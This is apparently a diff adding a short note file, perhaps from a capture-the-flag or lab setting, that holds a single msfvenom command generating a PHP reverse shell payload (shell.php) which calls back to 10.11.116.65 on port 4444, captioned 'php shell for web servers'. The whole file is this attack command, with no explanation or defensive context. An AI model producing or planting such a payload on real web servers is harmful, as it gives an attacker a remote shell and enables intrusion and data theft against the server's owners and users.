@@ -1,0 +1,3 @@
+msfvenom -p php/reverse_php LHOST=10.11.116.65 LPORT=4444 -f raw > shell.php
+
+php shell for web servers
